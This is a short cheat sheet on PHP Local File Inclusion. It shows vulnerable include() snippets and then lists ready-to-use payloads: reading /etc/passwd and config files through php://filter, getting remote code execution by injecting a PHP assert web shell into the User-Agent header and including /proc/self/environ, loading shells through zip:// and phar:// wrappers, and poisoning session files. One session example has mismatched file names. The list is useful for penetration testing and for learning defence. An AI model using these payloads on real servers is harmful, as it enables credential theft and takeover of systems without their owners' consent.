## Introduction

Brought from [Wikipedia](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Local_File_Inclusion), Local File Inclusion (LFI) is similar to a Remote File Inclusion vulnerability except instead of including remote files, only local files i.e. files on the current server can be included for execution.

For instance:

```php
include $_GET['file'];
```

or harder one,

```php
include $_GET['file'] . ".php";
```

## Tricks

### Direct Local File Inclusion

- Reading arbitrary files:
    * `index.php?file=/etc/passwd`
    * `index.php?file=php://filter/convert.base64-encode/resource=config.php`

- Remote code exection:
    * /proc/self/environ
        ```
        GET /index.php?file=/proc/self/environ&cmd=id HTTP/1.1
        Host: www.site.com
        User-Agent: <?php echo assert($_GET['cmd']);?>
        ```
    * Zip and Phar wrappers
        - `index.php?file=zip://image.zip#shell.php`
        - `index.php?file=phar://image.phar/shell.php`

    * Session Files
        - PHP5 stores session files in `/var/lib/php5/sess_*`
            ```
            Cookie: PHPSESSID=123php # /var/lib/php5/sess_123php
            index.php?file=/var/lib/php5/sess_123php
            ```

### Indirect Local File Inclusion

- Reading arbitrary files:
    * `index.php?file=php://filter/convert.base64-encode/resource=config # will append ".php" at the end`

- Remote code exection:
    * Zip and Phar wrappers
        - `index.php?file=zip://image.zip#shell`
        - `index.php?file=phar://image.phar/shell`
    * Session Files
        - PHP5 stores session files in `/var/lib/php5/sess_*`
            ```
            Cookie: PHPSESSID=123php # /var/lib/php5/sess_123php
            index.php?file=/var/lib/php5/sess_123
            ```
### Research
https://dustri.org/b/files/PHP_LFI_rfc1867_temporary_files.pdf - Gynvael LFI to RCE via /tmp + phpinfo
https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf - further research on Gynvael method
https://dustri.org/b/from-lfi-to-rce-in-php.html - More current method

https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfile - LFI cheat sheet
